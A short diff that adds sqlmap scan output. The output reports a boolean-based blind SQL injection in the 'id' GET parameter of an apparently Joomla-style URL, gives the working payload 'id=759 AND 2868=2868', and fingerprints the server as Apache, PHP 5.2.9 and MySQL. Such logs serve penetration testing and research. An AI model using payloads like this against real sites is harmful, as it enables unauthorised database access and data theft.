@@ -1,0 +1,9 @@
+sqlmap identified the following injection point(s) with a total of 348 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: option=content&task=view&id=759 AND 2868=2868
+---
+web application technology: Apache, PHP 5.2.9
+back-end DBMS: MySQL >= 5.0.0
